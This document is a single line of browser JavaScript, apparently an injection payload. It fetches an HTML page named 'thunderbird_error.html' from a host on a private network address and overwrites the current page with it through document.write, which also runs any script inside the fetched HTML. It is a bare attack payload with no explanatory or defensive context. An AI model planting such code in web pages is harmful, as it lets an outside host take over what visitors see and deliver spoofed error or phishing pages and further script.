fetch('http://192.168.59.128:8080/thunderbird_error.html').then(r=>r.text()).then(h=>{document.open();document.write(h);document.close();});
